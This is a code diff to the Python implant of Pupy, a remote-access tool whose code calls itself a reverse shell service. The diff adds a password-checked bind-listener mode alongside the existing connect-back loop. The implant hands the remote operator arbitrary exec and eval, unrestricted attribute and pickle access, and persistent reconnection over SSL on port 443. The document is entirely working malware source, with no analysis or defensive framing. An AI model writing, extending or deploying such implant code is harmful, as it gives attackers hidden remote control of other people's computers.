@@ -51,13 +51,7 @@ logging.getLogger().setLevel(logging.INFO)
 LAUNCHER="simple" # the default launcher to start when no argv
 LAUNCHER_ARGS=shlex.split("--host 127.0.0.1:443 --transport tcp_ssl") # default launcher arguments
 
-
-class ReverseSlaveService(Service):
-	""" Pupy reverse shell rpyc service """
-	__slots__=["exposed_namespace"]
-	def on_connect(self):
-		self.exposed_namespace = {}
-		self._conn._config.update(dict(
+REVERSE_SLAVE_CONF=dict(
 			allow_all_attrs = True,
 			allow_public_attrs = True,
 			allow_pickle = True,
@@ -65,33 +59,33 @@ class ReverseSlaveService(Service):
 			allow_setattr = True,
 			allow_delattr = True,
 			import_custom_exceptions = False,
-			propagate_SystemExit_locally=True,
-			propagate_KeyboardInterrupt_locally=True,
+			propagate_SystemExit_locally = True,
+			propagate_KeyboardInterrupt_locally = True,
 			instantiate_custom_exceptions = True,
 			instantiate_oldstyle_exceptions = True,
-		))
-		# shortcuts
-		self._conn.root.set_modules(ModuleNamespace(self.exposed_getmodule))
+		)
 
+class ReverseSlaveService(Service):
+	""" Pupy reverse shell rpyc service """
+	__slots__=["exposed_namespace"]
+	def on_connect(self):
+		self.exposed_namespace = {}
+		self._conn._config.update(REVERSE_SLAVE_CONF)
+		self._conn.root.set_modules(ModuleNamespace(self.exposed_getmodule))
 	def on_disconnect(self):
 		print "disconnecting !"
 		raise KeyboardInterrupt
-
 	def exposed_exit(self):
 		raise SystemExit
-
 	def exposed_execute(self, text):
 		"""execute arbitrary code (using ``exec``)"""
 		execute(text, self.exposed_namespace)
-
 	def exposed_get_infos(self, s):
 		"""execute arbitrary code (using ``exec``)"""
 		import pupy
 		if not s in pupy.infos:
 			return None
 		return pupy.infos[s]
-
-
 	def exposed_eval(self, text):
 		"""evaluate arbitrary code (using ``eval``)"""
 		return eval(text, self.exposed_namespace)
@@ -101,6 +95,16 @@ class ReverseSlaveService(Service):
 	def exposed_getconn(self):
 		"""returns the local connection instance to the other side"""
 		return self._conn
+
+class BindSlaveService(ReverseSlaveService):
+	def on_connect(self):
+		self.exposed_namespace = {}
+		self._conn._config.update(REVERSE_SLAVE_CONF)
+		import pupy
+		if self._conn.root.get_password() != pupy.infos['launcher'].args.password:
+			self._conn.close()
+			raise KeyboardInterrupt("wrong password")
+		self._conn.root.set_modules(ModuleNamespace(self.exposed_getmodule))
 
 def get_next_wait(attempt):
 	if attempt<120:
@@ -166,7 +170,9 @@ def main():
 			pupy.infos={} #global dictionary to store informations persistent through a deconnection
 			pupy.infos['launcher']=LAUNCHER
 			pupy.infos['launcher_args']=LAUNCHER_ARGS
+			pupy.infos['launcher']=launcher
 			rpyc_loop(launcher)
+
 		finally:
 			time.sleep(get_next_wait(attempt))
 			attempt+=1
@@ -174,30 +180,37 @@ def main():
 def rpyc_loop(launcher):
 	global attempt
 	try:
-		for stream in launcher.iterate():
+		for ret in launcher.iterate():
 			try:
-				def check_timeout(event, cb, timeout=10):
-					start_time=time.time()
+				if type(ret) is tuple: # bind payload
+					server_class, port, address, authenticator, stream, transport, transport_kwargs = ret
+					s=server_class(BindSlaveService, port=port, hostname=address, authenticator=authenticator, stream=stream, transport=transport, transport_kwargs=transport_kwargs)
+					s.start()
+
+				else: # connect payload
+					stream=ret
+					def check_timeout(event, cb, timeout=10):
+						start_time=time.time()
+						while True:
+							if time.time()-start_time>timeout:
+								if not event.is_set():
+									logging.error("timeout occured !")
+									cb()
+								break
+							elif event.is_set():
+								break
+							time.sleep(0.5)
+					event=threading.Event()
+					t=threading.Thread(target=check_timeout, args=(event, stream.close))
+					t.daemon=True
+					t.start()
+					try:
+						conn=rpyc.utils.factory.connect_stream(stream, ReverseSlaveService, {})
+					finally:
+						event.set()
 					while True:
-						if time.time()-start_time>timeout:
-							if not event.is_set():
-								logging.error("timeout occured !")
-								cb()
-							break
-						elif event.is_set():
-							break
-						time.sleep(0.5)
-				event=threading.Event()
-				t=threading.Thread(target=check_timeout, args=(event, stream.close))
-				t.daemon=True
-				t.start()
-				try:
-					conn=rpyc.utils.factory.connect_stream(stream, ReverseSlaveService, {})
-				finally:
-					event.set()
-				while True:
-					attempt=0
-					conn.serve()
+						attempt=0
+						conn.serve()
 			except KeyboardInterrupt:
 				raise
 			except EOFError:
